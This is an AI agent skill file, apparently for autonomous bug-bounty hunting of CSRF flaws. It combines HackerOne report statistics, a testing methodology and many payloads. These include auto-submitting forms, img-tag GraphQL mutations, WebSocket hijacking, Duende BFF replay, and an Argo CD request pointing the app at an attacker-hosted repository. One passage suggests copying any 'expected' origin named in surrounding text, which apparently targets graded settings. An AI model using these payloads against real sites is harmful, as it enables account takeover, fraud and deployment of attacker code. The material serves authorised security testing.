---
name: csrf
description: >-
  Hunting skill for csrf vulnerabilities. Built from 15 public bug bounty reports including modern variants
  — SameSite=Lax sibling-subdomain bypass (Argo CD CVE-2024-22424), GraphQL mutations-via-GET (GitLab
  $3,370), framework-wide CSRF middleware disabled (Stripe Dashboard $5,000), path-traversal CSRF-token
  bypass (GitHub Enterprise CVE-2022-23732 $10k), Origin-omission bypass (TikTok $2,500), OAuth-state null-
  byte (Streamlabs), WebSocket CSRF / CSWSH (Coda), default-SameSite email-change → ATO (YoYo Games $400),
  social-account-link CSRF (HackerOne), JSON-CSRF via text/plain on email-change (TikTok $500). Use when
  hunting modern CSRF — heavy emphasis on chain-to-ATO patterns. Combined with the HackerOne field guide
  (real disclosed-report data: where it pays, quick wins, payload banks). Hunt CSRF and state-changing
  request forgery. Use when testing account settings, email/password changes, OAuth flows, and JSON
  endpoints. Backed by 541 disclosed HackerOne reports.
---

# CSRF — Combined Field Guide

**Merged skill.** This fuses two complementary sources into one reference:

- **Part 1 — HackerOne field guide:** statistics from disclosed reports, "where it pays," quick wins, and curated payload banks.
- **Part 2 — Bug hunter methodology:** autonomous testing priority, canary discipline, crown-jewel targeting, OOB/validation gates, and reporting guidance.

**How to use:** Open with Part 2 for execution discipline (set your canary, know your success/failure gate). Use Part 1 to prioritize targets and pull payloads. Before reporting, run the validation gates in both parts.

---

<!-- ============ PART 1: HACKERONE FIELD GUIDE (data + payloads) ============ -->

# Cross-Site Request Forgery (CSRF) — HackerOne field guide

Built from **541** publicly disclosed HackerOne reports (2014–2026). Corpus: `~/.local/share/hackerone-reports/`.

**Reference files (load on demand):**

- `references/payloads.md` — payload banks, probes, wordlists, Nuclei templates, observed parameters
- `references/techniques.md` — quick wins, bypasses, real-report techniques, deeper checklists

## Signal

- Reports: **541** · paid: **93**
- Median bounty **$300** · p90 **$2,450** · max **$10,000** · total **$69,328**
- Median upvotes **9**

## Where it pays

| Program | Reports | Bounty | Upvotes |
|---|---|---|---|
| GitHub | 2 | $10,000 | 152 |
| HackerOne | 20 | $8,850 | 735 |
| GitLab | 6 | $6,570 | 287 |
| X / xAI | 16 | $5,320 | 598 |
| TikTok | 12 | $4,847 | 847 |
| Internet Bug Bounty | 2 | $4,660 | 58 |
| Uber | 9 | $4,000 | 256 |
| PayPal | 1 | $3,500 | 81 |

## Where to look

Parameters, endpoints, and fields that commonly carry this bug:

`email` `password` `change` `delete` `transfer` `invite` `settings` `oauth` `consent`

## Tools

`Burp CSRF PoC generator` · `browser devtools` · `mitmproxy`

## Escalation chains

- CSRF -> email change -> ATO.
- CSRF -> OAuth link -> ATO.
- CSRF + XSS -> worm.

## Related

- `xss` (2,569 reports)
- `oauth-oidc` (177 reports)
- `clickjacking` (166 reports)

## Reporting bar

- Prove real impact on a second controlled account or a safe callback.
- Keep the PoC minimal and reproducible; include raw requests and exact IDs.
- Stay inside program scope and follow disclosure rules.

---

<!-- ============ PART 2: BUG HUNTER METHODOLOGY (execution + validation) ============ -->

## Shortcut: a raw HTTP client beats a real cross-origin page for header-check CSRF

A raw HTTP client (curl, Burp Repeater, any scripting client) is not a browser: it will send
whatever `Origin`/`Referer` header VALUE you set, from any path, on the same connection as your
authenticated cookie. Many apps that claim to defend against CSRF only do a naive **string check**
on the incoming `Origin`/`Referer` header (does it contain/equal some expected value?) rather than
real same-origin enforcement — you can satisfy that check directly by setting the header, with no
actual cross-site delivery (hosting an HTML page, a headless browser) required. This is faster and
more reliable than building a real attacker page for this exact pattern:
```
POST /profile HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Origin: https://a-domain-the-app-treats-as-trusted-or-attacker-controlled.example
Cookie: <authenticated session>

username=csrf_poc
```
If some text names a SPECIFIC origin/domain as the "expected" attacker page, that literal value is
often exactly what the server's check is looking for — try it verbatim in `Origin` (fall back to
`Referer` if `Origin` alone doesn't flip it). Only build a real cross-origin page (actual browser
delivery) when the target does genuine SameSite/fetch-based origin enforcement that a spoofed header
can't satisfy.

## Autonomous Testing Priority

**CSRF only matters on state-changing actions that a browser could be tricked into making cross-site.**

**Testing flow:**
1. **GET the form endpoint** to establish a baseline and check what fields exist (look for hidden `csrf_token`, `authenticity_token`, `_token`, `csrfmiddlewaretoken` fields).
2. **POST the state-changing action without any CSRF token field.** Send only the functional parameters (email, amount, etc.).
3. **Use a "simple-request" Content-Type** — `application/x-www-form-urlencoded`, `multipart/form-data`, OR `text/plain` are the three CORS "simple" content-types a cross-origin form can send with no preflight. A JSON endpoint is CSRF-resistant **only if the server rejects those** — if it also accepts a `text/plain` body (common), craft a `text/plain` payload that parses as valid JSON (see the JSON-CSRF-via-text/plain section). Don't skip a JSON endpoint on the assumption that `application/json` alone is protective.
4. **If the action succeeds (2xx, no "invalid token" error) → CSRF is confirmed.**

**High-value targets (in order of impact):**
- Email/password change → account takeover
- Money transfer or payment → financial fraud
- Admin actions (role assignment, user deletion)
- OAuth social-account linking → persistent ATO

**Token bypass techniques when a token IS present:**
- Omit the token field entirely — some frameworks only validate if the field exists, not if it's absent
- Send an empty value (`_token=`) — some validate format, not presence
- Copy a token from another session — some tokens aren't tied to the session

**Scope:** Don't test CSRF on login forms (no existing session to exploit), logout (no real impact), or read-only GET endpoints.

---

## Crown Jewel Targets

CSRF becomes high-value when it touches **state-changing actions with account-level or financial consequences**. The highest-paying targets are:

- **Account takeover vectors**: OAuth/SSO flows (RelayState manipulation), social account linking/unlinking (Oculus-Facebook, SocialClub), import-friends features that expose OAuth tokens
- **Authentication infrastructure**: Login CSRF, session fixation via CSRF, forced account association
- **API endpoints accepting cross-origin POST**: JSON APIs, heartbeat/activity APIs, anything that skips Content-Type enforcement
- **Third-party integrations**: Grafana, monitoring dashboards, embedded analytics — often lag on CSRF protections
- **Social platforms**: Twitter/X collections, friend imports, social graph mutations — high-volume, authenticated actions with real user impact

**Asset types that pay most:** Core product auth flows > API gateways > third-party integrations running on subdomains > admin panels.

---

## Attack Surface Signals

### URL Patterns
```
/oauth/authorize?RelayState=
/accounts/link
/import/friends
/api/v*/heartbeat
/api/v*/collect
/monitoring/* (Grafana, Prow, Prometheus)
/auth/saml/callback
/connect/* (social integrations)
```

### Response Header Signals
```
# Missing or weak SameSite cookie attributes
Set-Cookie: session=abc123; HttpOnly        # no SameSite = vulnerable
Set-Cookie: session=abc123; SameSite=None   # explicitly allows cross-site

# Missing CSRF headers
# No X-Frame-Options or permissive CORS
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true      # dangerous combo
```

### JS / DOM Patterns
```javascript
// Static or predictable CSRF tokens
meta[name="csrf-token"]   // grep if value changes across sessions
authenticity_token        // Rails — check if reused across page loads

// JSON endpoints without Content-Type enforcement
fetch('/api/heartbeat', {method: 'POST', body: JSON.stringify(data)})

// No CSRF token in form at all
<form method="POST" action="/accounts/link">  // no hidden token field
```

### Tech Stack Signals
- **Rails apps**: Look for `authenticity_token` — test if it's static per session
- **Django apps**: Check `csrfmiddlewaretoken` — test cross-user/session reuse
- **Grafana instances**: CVE-2022-21703 — check version via `/api/health`
- **SAMLv2/OIDC flows**: `RelayState` parameter rarely validated
- **Express/Node APIs**: Often skip CSRF middleware on `/api/*` routes

---

## Step-by-Step Hunting Methodology

1. **Map all state-changing endpoints** — Spider authenticated session, filter for POST/PUT/DELETE/PATCH. Note every form and AJAX call.

2. **Check cookie SameSite attributes** — In DevTools → Application → Cookies. Flag any session cookie without `SameSite=Strict` or `Lax`.

3. **Test token staticness** — Log in twice (different sessions or incognito). Compare `authenticity_token` / `csrfmiddlewaretoken` / `csrf-token` values across:
   - Same session, different page loads (should be different)
   - Different sessions for same user
   - Different users entirely

4. **Test token omission** — Remove the CSRF token field entirely from a POST request. If the server returns 200, you have CSRF.

5. **Test token substitution** — Replace the token with one from a different session. Server accepting it = broken validation.

6. **Test JSON endpoints for form-POST CSRF** — Check if Content-Type is enforced:
   - Send `application/x-www-form-urlencoded` to a JSON endpoint
   - Send `text/plain` with a JSON body
   - If accepted, HTML form can trigger it cross-origin

7. **Hunt OAuth/SSO RelayState** — Intercept SAML/OIDC flows. Test if `RelayState` is validated for same-origin. Inject external URLs.

8. **Check social linking flows** — Every "connect your X account" feature. These often use redirect-based OAuth where CSRF on the callback can associate an attacker's social account.

9. **Test third-party dashboards on subdomains** — Grafana, Kibana, Prometheus. Check version, apply known CVEs, test default CSRF posture.

10. **Build PoC HTML page** — Host on a different origin, fire the request, confirm cookies are sent and action executes.

---

## Common Root Causes

1. **Static CSRF tokens per session** — Developers generate one token at login and reuse it. Airbnb bug: `authenticity_token` was the same across all page loads for a session, making it trivially leakable.

2. **Token not tied to user identity** — Token is valid server-wide or rotates on a schedule, not per-user/session. Mozilla bug: `csrftoken` reusable across users.

3. **Missing token on "secondary" endpoints** — Developers protect login/signup but forget API endpoints, import flows, or webhook handlers.

4. **JSON API assumption of safety** — Belief that `Content-Type: application/json` prevents CSRF. It does via CORS preflight — unless the server also accepts `text/plain` or `application/x-www-form-urlencoded`.

5. **SameSite=None for cross-site embeds** — Developers set `SameSite=None` to support iframe embeds or third-party integrations, inadvertently re-enabling CSRF.

6. **OAuth RelayState not validated** — Developers implement SAML/OIDC but treat `RelayState` as a redirect hint, not a CSRF state parameter requiring cryptographic binding.

7. **Framework misconfiguration** — CSRF middleware excluded for `/api/*` routes in Django/Rails because "API clients don't need it," but browser-based JS clients do.

8. **Third-party software defaults** — Grafana, Kibana, Jenkins shipped with weak or no CSRF protection in older versions; teams don't patch or check.

---

## Gate 0 Validation

1. **What can the attacker DO right now?** — The attacker must be able to trigger a specific state-changing action (account linking, email change, data deletion, social association) on behalf of the victim without any interaction beyond visiting a URL or page.

2. **What does the victim LOSE?** — Identify the concrete harm: account access (ATO), data exposure, financial loss, reputation damage. "A CSRF token is missing" is not impact — "attacker can link their Oculus account to victim's Facebook account, gaining full profile access" is impact.

3. **Can it be reproduced in 10 minutes from scratch?** — You must be able to: (a) create attacker and victim accounts, (b) host a static HTML PoC, (c) have victim visit PoC, (d) confirm the action executed in victim's account — all within 10 minutes with no additional prerequisites.

---

## Real Impact Examples

### Scenario 1: Social Account Takeover via Import Friends (Rockstar Games)
An attacker crafted a malicious page targeting the "Import Friends" OAuth integration. When an authenticated SocialClub user visited the page, the CSRF triggered the OAuth token exchange with an attacker-controlled social account. The victim's SocialClub account became permanently linked to the attacker's Facebook/social identity, enabling full account access without the victim's knowledge. Rated high severity due to complete account compromise path.

### Scenario 2: Facebook Account Hijacking via Oculus Integration CSRF
During Oculus-Facebook account linking, the OAuth callback lacked proper CSRF state validation. An attacker could craft a URL that, when loaded by an authenticated Facebook user who had started the Oculus linking flow, would associate the attacker's Oculus device credentials with the victim's Facebook account. The attacker then had persistent access to the victim's Facebook profile through the Oculus app. The attack required only that the victim click a link while logged into Facebook.

### Scenario 3: JSON API CSRF on Heartbeat/Activity Tracking
A POST endpoint accepting `application/json` was assumed CSRF-safe by developers. A researcher crafted an HTML form using `enctype="text/plain"` with an input name designed to produce syntactically valid JSON when submitted. The browser sent the request cross-origin without a preflight (no custom headers, `text/plain` is a simple request), cookies were attached, and the server processed the JSON body as legitimate — silently logging attacker-controlled activity data under the victim's account identity.

---

## Disclosed Report Citations (Backfill +5 — 2020-2024)

The following real, verified bug-bounty / coordinated-disclosure cases extend this skill. Four cases chain CSRF to full ATO; all five are modern (SameSite-era).

11. **Argo CD — SameSite=Lax bypass via sibling subdomain + Content-Type abuse (CVE-2024-22424)** ([GHSA-92mw-q256-5vwg](https://github.com/argoproj/argo-cd/security/advisories/GHSA-92mw-q256-5vwg) · [Writeup](https://blog.calif.io/p/argo-cd-csrf))
    - Subclass: SameSite=None/Lax misconfig chain — same parent-domain bypass + JSON CSRF via missing Content-Type enforcement
    - Payload: hosted on `marketing.victim.com`, target `argocd.internal.victim.com` → `fetch('https://argocd.internal.victim.com/api/v1/applications', {method:'POST', credentials:'include', body:'{"metadata":{"name":"pwn"},"spec":{"source":{"repoURL":"https://attacker/manifest.git"}}}'})`
    - Root cause: Argo CD did not enforce `Content-Type: application/json`, and SameSite=Lax is moot when the attacker controls any sibling subdomain of the shared parent
    - Year: 2023 reported, fixed Jan 2024 in 2.7.16/2.8.8/2.9.4

12. **GitLab — CSRF on `/api/graphql` via GET-converted mutations** ([H1 #1122408](https://hackerone.com/reports/1122408))
    - Subclass: GET-state-changing endpoint (GraphQL mutations through GET requests)
    - Payload: `<img src="https://gitlab.com/api/graphql?query=mutation{createSnippet(input:{title:%22x%22,visibilityLevel:public,content:%22pwn%22}){snippet{id}}}">`
    - Root cause: backend skipped `X-CSRF-Token` validation when the HTTP method was GET; GraphQL accepted mutations via `?query=mutation{...}` query string
    - Year: 2021 — **$3,370**

13. **Stripe Dashboard — CSRF middleware disabled by code change** ([H1 #1483327](https://hackerone.com/reports/1483327))
    - Subclass: framework misconfiguration — middleware globally disabled
    - Payload: `<form method="POST" action="https://dashboard.stripe.com/account/settings" enctype="text/plain"><input name='{"business_name":"pwned","x":"' value='"}'></form>` + auto-submit script
    - Root cause: 2022-02-14 deploy inadvertently turned off CSRF middleware across all Stripe Dashboard endpoints
    - Year: 2022 — **$5,000** ($2,500 × 2 researchers)

14. **GitHub Enterprise Server — CSRF bypass via path traversal (CVE-2022-23732)** ([H1 #1497169](https://hackerone.com/reports/1497169))
    - Subclass: CSRF token validation bypass (path traversal smuggles request past token check)
    - Payload: `<form method=POST action="https://ghes.victim.com/setup/api/start/..%2f..%2fadmin%2fusers"><input name=login value=attacker></form>`
    - Root cause: router matched the post-traversal path for execution but pre-traversal path for CSRF-protection scope, so the protected endpoint was reached without a valid token
    - Year: 2022 — **$10,000**

15. **HackerOne self — CSRF on social account linking → ATO** ([H1 #1727221](https://hackerone.com/reports/1727221))
    - Subclass: account-link CSRF (social provider attach without state binding)
    - Payload: `<img src="https://hackerone.com/users/social_accounts/google?code=ATTACKER_CODE&state=PREDICTABLE">` — victim's browser completes attacker-initiated link flow
    - Root cause: token bound to OAuth-link callback was either reused across attempts or not user-bound, so attacker-issued link callbacks were accepted on the victim's session — attacker's Google account becomes a valid login path = ATO
    - Year: 2022 — informational scope on H1 self-program, but public PoC

---

## Duende BFF — Role-Partitioned Antiforgery (2024-2026 surface)

Duende BFF (commercial successor to IdentityServer4) is the canonical ASP.NET Core BFF library for SPAs. Its antiforgery primitive is **non-standard and not user-bound**: instead of ASP.NET Core's per-session/per-user double-submit token, Duende only requires the presence of a **static header `X-CSRF: 1`** on every BFF-mapped endpoint. The header value is identical for every caller; it exists only to force a CORS preflight on cross-origin calls. This collapses CSRF defence to "same-origin + session cookie present" — and produces several distinct attack patterns when one BFF serves multiple privilege partitions.

**Architecture primer:** browser↔BFF authenticates via an encrypted HttpOnly session cookie (default `.AspNetCore.Cookies`); BFF↔API uses OAuth tokens cached server-side. Endpoints registered via `MapBffManagementEndpoints` / `MapRemoteBffApiEndpoint` / `MapBffApiEndpoint` enforce `X-CSRF: 1` and session presence — nothing else. ([docs.duendesoftware.com/bff](https://docs.duendesoftware.com/bff/), [Duende blog Mar 2025](https://duendesoftware.com/blog/20250325-understanding-antiforgery-in-aspnetcore))

### Attack class 1 — `X-CSRF: 1` is not user-bound, so cross-role replay succeeds same-origin

When a single BFF serves `/admin/*` and `/user/*` partitions, the antiforgery primitive cannot distinguish role-A from role-B. Any same-origin script that can land an XHR with `X-CSRF: 1` and the victim's session cookie reaches admin endpoints if the victim has the admin role. Stock ASP.NET Core antiforgery (which binds the token to `HttpContext.User.Identity.Name` and rejects on identity change) does the right thing here; Duende BFF does not. ([docs.duendesoftware.com/bff/fundamentals/options](https://docs.duendesoftware.com/bff/fundamentals/options/))

**Payload shape:** from a logged-in low-priv session, `fetch('/bff/admin/users/delete?id=42', {credentials:'include', headers:{'X-CSRF':'1'}})` — succeeds if the victim's session happens to hold the admin role and the attacker can land any same-origin script (self-XSS, subdomain-takeover JS, dependency-confusion).

### Attack class 2 — SignalR/WebSocket carve-out (the `/negotiate` shortcut)

Browser WebSockets cannot send custom headers, so `X-CSRF: 1` cannot be enforced on the upgrade. Developers routinely work around this by **excluding SignalR hub paths from BFF antiforgery** (`MapHub<X>().DisableAntiforgery()` or registering them as non-BFF endpoints). Once excluded, any same-site origin (including a takenover sibling subdomain or a stored-XSS page) can open the WS with the ambient session cookie → CSRF-over-WebSocket to invoke hub methods that mutate state.

**Payload shape:** cross-origin page opens `new WebSocket("wss://bff.example.com/hubs/admin")` — browser sends session cookie, no `X-CSRF` required, attacker invokes `DeleteUser(id)` via standard SignalR JSON frame. ([DuendeArchive/Support#972](https://github.com/DuendeArchive/Support/issues/972), [learn.microsoft.com/aspnet/core/signalr/security](https://learn.microsoft.com/en-us/aspnet/core/signalr/security))

### Attack class 3 — Cookie-domain wildcarding turns subdomain takeover into session fixation

BFF session cookies default to host-only, but developers commonly override with `options.Cookie.Domain = ".example.com"` to share login across `app.example.com` and `admin.example.com`. This drops the `__Host-` prefix protection. Take over `legacy.example.com` (CNAME to deprovisioned Heroku/S3) → set `Set-Cookie: .AspNetCore.Cookies=<attacker_session>; Domain=.example.com` → victim hits `app.example.com` carrying attacker's session = session-fixation ATO. ([nestenius.se BFF cookie hardening](https://nestenius.se/net/bff-in-asp-net-core-3-the-bff-pattern-explained/))

### Evidence strength

No Duende.BFF-direct CVE exists as of 2026-05. The three classes above are **design-level / documented behaviour** that becomes a live finding when paired with a co-resident primitive (same-origin script execution, SignalR carve-out, or subdomain takeover). Report severity should lean on the chain's business impact rather than CVE citation. Adjacent confirmed CVEs in the Duende ecosystem: CVE-2025-26620 (`Duende.AccessTokenManagement` race), CVE-2024-51987 (`Duende.AccessTokenManagement.OpenIdConnect` incorrect-token-after-refresh), CVE-2024-39694 (`Duende.IdentityServer` open redirect). ([Duende advisories on GitHub](https://github.com/advisories?query=duende))

### Hunting checklist

1. `curl https://target/bff/user -H 'X-CSRF: 1' -b '<session>'` — dumps the full claim set including internal IDs, role names, tenant IDs (info disclosure on its own).
2. Inspect `Set-Cookie` on `/bff/login` callback — flag `Domain=` attribute (vs `__Host-` prefix); flag missing `Secure`/`HttpOnly`.
3. From a low-priv session, replay admin-partition POSTs with `X-CSRF: 1` to confirm no per-role token binding.
4. Enumerate SignalR/WS hubs (`/hubs/*`, `/signalr/*`) — open without `X-CSRF`; if 101 Switching Protocols, CSWSH-style attacks viable.
5. Subdomain inventory + DNS-takeover scan for any `*.example.com` if BFF cookie has `Domain=.example.com`.

---

## Related Skills & Chains

- **`xss`** — Any XSS on a trusted origin neutralizes CSRF defenses (token, SameSite, Origin check) instantly. Chain primitive: XSS reads the `meta[name=csrf-token]` value and same-origin-fetches `/accounts/email` with attacker payload → one-click ATO via attacker-page postMessage triggering the stored XSS to perform the state change.
- **`auth-bypass`** — CSRF combined with an auth-bypass primitive lets attacker-side scripts perform state changes that should have required step-up auth. Chain primitive: CSRF on `/settings/password` reaches an endpoint that skips the re-auth check → password change executes without the victim ever entering their current password → ATO.
- **`oauth-oidc`** — OAuth/SAML `state`/`RelayState` is structurally a CSRF token; missing validation here is account-linking CSRF. Chain primitive: attacker initiates OAuth on their account, sends victim the `/callback?code=X&state=` URL → victim's logged-in browser completes the link → attacker's social identity now controls victim's account.
- **`security-arsenal`** — Reach for the CSRF PoC templates (form POST, `enctype=text/plain` JSON, sandboxed-iframe null-origin, base64 multipart bypass) before writing one from scratch; also the WAF-bypass header variants for Origin/Referer checks.
- **`triage-validation`** — Run the Pre-Severity Gate before submitting CSRF on a logout endpoint or any action without state-change consequence — those are the canonical N/A traps. Confirm victim LOSES something concrete (account access, money, data), not just "a request executed."

## Web-Research Methodology Additions (2026)

Research basis: PortSwigger Web Security Academy "Bypassing SameSite cookie restrictions" and the OWASP CSRF Prevention Cheat Sheet (Fetch Metadata, client-side CSRF, signed double-submit cookies, origin verification). OWASP's leading reminder still governs triage: **XSS defeats every CSRF mitigation** — so if you have XSS, chain it rather than double-reporting.

### A. Discovery checklist — concrete places, params, headers, flows to look

- **Fetch Metadata headers on protected requests:** `Sec-Fetch-Site` (same-origin / same-site / cross-site / none), `Sec-Fetch-Mode`, `Sec-Fetch-Dest`, `Sec-Fetch-User`, plus a `Vary: Sec-Fetch-Site, Origin` response. A missing/ignored `Sec-Fetch-Site` is the newest common gap.
- **Origin verification logic:** `Origin` / `Referer` checks, and whether a literal `null` is allow-listed. OWASP warns null origins arise from cross-origin redirects and sandboxed iframes without `allow-same-origin` — both attacker-creatable.
- **Custom CSRF header names:** `X-CSRF-Token` (Rails/Laravel/Django), `X-XSRF-Token` (AngularJS), `CSRF-Token` (Express csurf), `X-CSRFToken`. Their presence implies a preflight-based defense — test whether the server actually rejects requests lacking them.
- **Cookie shape:** `__Host-` prefix vs a bare `Domain=` cookie; `SameSite=Strict|Lax|None`, `Secure`. A domain-scoped session cookie shared with sibling subdomains is the classic site-based bypass.
- **Double-submit implementation:** is the token merely duplicated in a cookie (naive, forgeable via a sibling subdomain or plaintext-HTTP cookie injection) or HMAC-bound to the session (signed)?
- **Client-side CSRF gadgets:** JS that builds `fetch()` from `location.hash` / `location.search` (e.g. `#post;/api/profile`), DOM-based open redirects used as on-site gadgets, `postMessage`-driven requests.
- **Sites vs origins:** enumerate every sibling subdomain of the registrable domain — a cross-origin, same-site XSS/subdomain-takeover defeats SameSite entirely.
- **Framework built-ins:** .NET antiforgery, Go 1.25+ `CrossOriginProtection` (Fetch-Metadata based), framework-wide middleware that may be disabled on `/api/*`.
- **Also:** WebSocket handshake endpoints (CSWSH), GET-based state changes, login CSRF, GraphQL mutations via GET.

- **Protected-action inventory:** spider the authenticated session and list every POST/PUT/PATCH/DELETE with its Content-Type and whether a token/header is required. Missing coverage on one endpoint is the finding.
- **Fetch-Metadata server behavior:** does the app check `Sec-Fetch-Site` at all? Log the header value and resulting decision for same-origin, same-site, cross-site, and absent cases.
- **Cookie domain audit:** compare `Set-Cookie` across login, logout, and BFF endpoints; a `Domain=.example.com` cookie with a dangling sibling CNAME is a concrete chain.
- **Token lifecycle:** capture the same token across two page loads, two sessions of one user, and two different users. Static-per-session or cross-user reuse are exploitable.
- **CORS config:** `Access-Control-Allow-Origin` with credentials plus a permissive subdomain regex enables the custom-header bypass from a taken-over sibling.
- **Login/session-fixation surface:** forced-login CSRF and pre-set session IDs via `?next=`/`redirect` parameters.
- **Form-action / polyglot surface:** `<form enctype="text/plain">` producing valid JSON, and base64/multipart wrappers used to smuggle a body past a naive content-type check.
- **GraphQL mutation-via-GET:** test `?query=mutation{...}` — a backend that skips token checks for GET is exploitable via `<img src>`.

### B. Techniques & bypasses — specific actionable techniques/payload shapes

- **Lax + GET bypass:** if the server accepts GET for a state-changing route, a top-level navigation sends the Lax cookie: `<script>document.location='https://target/account/transfer?to=hacker&amt=100'</script>`. Method-override parameters (Symfony `_method=POST`) turn a GET into a routed POST.
- **Strict bypass via on-site gadget:** a client-side redirect whose target comes from a URL parameter produces an ordinary **same-site** request (browsers don't treat client-side redirects as cross-site), so all cookies ride along. Server-side 302s do NOT work this way.
- **Vulnerable sibling domain:** any XSS or takeover on `*.example.com` can issue same-site requests, defeating site-based defenses and fetching custom headers if CORS is regex-permissive.
- **Null-origin bypass:** serve the PoC from a sandboxed iframe (`<iframe sandbox>` without `allow-same-origin`) so `e.origin` is `null`; if the app allowlists `null` (or compares against `window.origin`, which sandboxing also makes `null`), the check passes. PortSwigger also notes `Origin`-omission cases.
- **Naive double-submit forge:** from a controlled sibling or via plaintext HTTP cookie injection, plant a matching cookie; the server compares cookie==parameter and accepts. Only the signed, session-bound HMAC pattern resists this.
- **Referer string checks:** permissive prefix/format validation is bypassable the same way as weak postMessage/CORS checks (e.g. a look-alike host).
- **Client-side CSRF:** manipulate the hash fragment that the JS feeds to `fetch()` — the token and cookies are added by the trusted script itself, so synchronizer tokens and SameSite don't help: `https://site/index/#post;/api/account/profile`.
- **Fetch-Metadata policy gaps:** a policy that only rejects unsafe methods on `cross-site` may still allow cross-site GET to a sensitive endpoint; treating `same-site` as trusted is unsafe if a sibling is compromised; absent `Sec-Fetch-*` must fail closed, not open.
- **WebSocket CSWSH:** an attacker page opens `new WebSocket('wss://target/...')` — the browser sends the ambient cookie and no custom CSRF header can be required on the upgrade.

### C. Validation / proof bar — how to confirm and avoid false positives

- **Gate 0 (keep the skill's existing test):** attacker and victim accounts, a static PoC, victim visits, confirm the action executed in the victim's account — reproducible in 10 minutes. State what the victim *loses*, not that "a request fired."
- **Real browser for real defenses:** a spoofed `Origin`/`Referer` header proves only a naive string check (the raw-client shortcut in this skill). Genuine SameSite/fetch-based enforcement needs an actual cross-origin page and a browser to observe cookie attachment in DevTools.
- **Null-origin must be real:** produce it with a sandboxed iframe and show the request carrying the victim's cookie — don't claim it from a forged header.
- **Fetch-Metadata finding:** show the request's `Sec-Fetch-Site` value and that the server accepted it despite the policy.
- **Avoid false positives:** logout and login-only CSRF, read-only GETs, and "token missing on an endpoint that changes nothing" are N/A. XSS on the origin is not a separate CSRF finding — chain it.
- **Chain to severity:** prove ATO (email/account link), money movement, or admin state change; otherwise report at the base severity.

- **Method/Content-Type matrix:** repeat with form, `text/plain` JSON, and a custom header. A single accepted variant is the finding; document exactly which.
- **Origin variations:** no header, trusted value, look-alike value, and `null` — record which the server accepts.
- **Cookie attachment:** in the victim browser, confirm the session cookie is present on the cross-origin request (Network tab); if SameSite withheld it, the PoC fails.
- **State proof:** compare the victim account before/after — email, role, linked accounts, balance — not just a 200 response.
- **No-XSS condition:** ensure the chain does not depend on XSS on the target origin; if it does, report the XSS as primary.
- **Duplicate-report guard:** if the only issue is a missing token on a logout or read-only GET, kill the finding per the Gate 0 rules already in this skill.
- **Same-site gadget proof:** for a Strict-cookie bypass, show the client-side redirect producing a same-site request with cookies, and that a server-side 302 does NOT.
- **CSWSH proof:** show a cross-origin WebSocket opening with 101 and a hub/method call mutating state.
- **BFF-specific:** for Duende-style BFFs, replay an admin-partition call with `X-CSRF: 1` from a low-priv session and dump `/bff/user` claims.
- **Fetch-Metadata absence:** show a request with no `Sec-Fetch-*` headers (e.g. via an intercepting proxy that strips them) still succeeding.

### D. Sources — numbered list of URLs you actually fetched

1. https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions
2. https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html
